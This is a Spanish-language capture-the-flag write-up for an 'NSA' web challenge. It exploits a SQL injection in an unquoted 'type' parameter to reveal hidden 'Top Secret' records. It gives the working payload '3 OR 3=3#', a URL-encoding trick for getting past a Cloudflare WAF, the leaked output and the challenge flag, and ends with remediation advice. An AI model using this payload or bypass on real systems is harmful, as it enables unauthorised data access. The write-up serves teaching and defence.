[nsa-writeup.md](https://github.com/user-attachments/files/33026915/nsa-writeup.md)
# NSA — Writeup

## Descripción del desafío

Un agente secreto necesita acceder a los proyectos de tipo "APT" (Advanced
Persistent Threat). Esos proyectos tienen nivel de acceso "Top Secret", y a
causa de eso no puede verlos.

El objetivo es visualizar esos proyectos restringidos sin tener el nivel de
acceso correspondiente.

## Reconocimiento

La aplicación muestra un listado de proyectos filtrable por tipo mediante un
dropdown. Interceptando con Burp Suite, el filtro dispara:

```
GET /backend/index.php?type=1
```

Respuesta (ejemplo):

```json
{"status":"ok","data":{"projects":[
  {"code":"NS4_AS2","name":"Colombia warfare","type":"Spying","level":"Secret","owner":"Frank"},
  {"code":"NS4_A1L","name":"Nisman case","type":"Spying","level":"Restricted","owner":"Brian"}
]}}
```

Los proyectos de nivel "Top Secret" nunca aparecen en los resultados,
independientemente del tipo consultado.

## Vulnerabilidad

El parámetro `type` se concatena directamente en la consulta SQL sin
sanitizar ni usar sentencias preparadas (CWE-89, SQL Injection).

### Confirmación del punto de inyección

Probando distintos valores se fue reconstruyendo la lógica de la query:

- `type=ABC` (letras, sin comillas) →
  ```
  Unknown column 'ABC' in 'where clause'
  ```
  Esto es clave: indica que el parámetro se inserta **sin comillas** en la
  consulta (como si fuera numérico/identificador), no como string entre
  `'...'`.

- `type=3"` → error de sintaxis, confirmando que el valor cae dentro de una
  expresión de comparación.

- El servidor, al estar mal configurado (`display_errors` activo), devuelve
  el error de MySQL completo, revelando buena parte de la query real:

  ```sql
  ... WHERE p.id_tipo = [INPUT] AND p.id_nivel != (SELECT id FROM niveles WHERE nombre='Top Secret')
  ```

Esto confirma dos problemas de seguridad simultáneos:
1. **SQL Injection** por concatenación directa del parámetro.
2. **Information Disclosure** por mensajes de error verbosos del motor de
   base de datos expuestos al cliente.

## Explotación

Como el valor se inserta sin comillas, no hace falta cerrar ningún string:
alcanza con inyectar directamente lógica booleana y comentar el resto de la
condición que agrega la aplicación (el filtro de nivel "Top Secret").

**Payload (plano):**
```sql
3 OR 3=3#
```

**Request final:**
```
GET /backend/index.php?type=3%20OR%203=3%23
```

> Nota: hubo que ajustar el encoding porque el WAF de Cloudflare delante de
> la aplicación bloqueaba con 400 Bad Request ciertos patrones (`--`,
> combinaciones de `OR`/`AND` con comillas sin encodear). Usar `%23` en vez
> de `#` o `--` evitó el bloqueo, ya que el `#` sin codificar se interpreta
> como fragmento de URL y nunca llega al servidor.

### Por qué funciona

- `3 OR 3=3` hace que la condición del tipo sea verdadera para **todas**
  las filas de la tabla, sin importar el tipo real.
- `#` comenta el resto de la sentencia SQL, incluyendo la condición
  `AND p.id_nivel != (SELECT id FROM niveles WHERE nombre='Top Secret')`
  que excluía los proyectos "Top Secret".

### Resultado

```json
{"status":"ok","data":{"projects":[
  {"code":"NS4_AS2","name":"Colombia warfare","type":"Spying","level":"Secret","owner":"Frank"},
  {"code":"NS4_AN1","name":"Chinese Firewall","type":"Targeted attack","level":"Restricted","owner":"Eric"},
  {"code":"NS4_A1L","name":"Nisman case","type":"Spying","level":"Restricted","owner":"Brian"},
  {"code":"NS4_B2W","name":"Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c","type":"APT","level":"Top Secret","owner":"Brian"},
  {"code":"NS4_OIL","name":"EkoParty destruction","type":"APT","level":"Top Secret","owner":"Eric"}
]}}
```

**Flag:** `141e9ea9d1c4ade203ffe3ee03ebff1c`

## Causa raíz y remediación

- **Causa raíz:** concatenación directa de input del usuario en una
  sentencia SQL, sin parametrización, combinada con mensajes de error
  verbosos expuestos al cliente.

- **Remediación recomendada:**
  1. Usar **sentencias preparadas** (prepared statements / bindings) para
     separar completamente el código SQL de los datos:
     ```php
     $stmt = $pdo->prepare(
       "SELECT * FROM proyectos p WHERE p.id_tipo = :type
        AND p.id_nivel != (SELECT id FROM niveles WHERE nombre = 'Top Secret')"
     );
     $stmt->execute(['type' => $_GET['type']]);
     ```
  2. **Validar y tipar estrictamente** el input si se espera un valor
     numérico o de un conjunto cerrado (whitelist):
     ```php
     $type = filter_input(INPUT_GET, 'type', FILTER_VALIDATE_INT);
     if ($type === false) {
         // manejo de entrada inválida
     }
     ```
  3. **Desactivar errores detallados en producción** (`display_errors = Off`
     en `php.ini`), devolviendo respuestas genéricas de error (HTTP 500) sin
     exponer trazas internas de la base de datos.
  4. Aplicar el **principio de mínimo privilegio** en la base de datos, de
     forma que el usuario de la aplicación no pueda ver ni filtrar registros
     fuera de su alcance aunque la query se vea comprometida.

## Herramientas usadas

- Burp Suite (interceptación y repetición de requests)
- Análisis manual de mensajes de error SQL para reconstruir la query
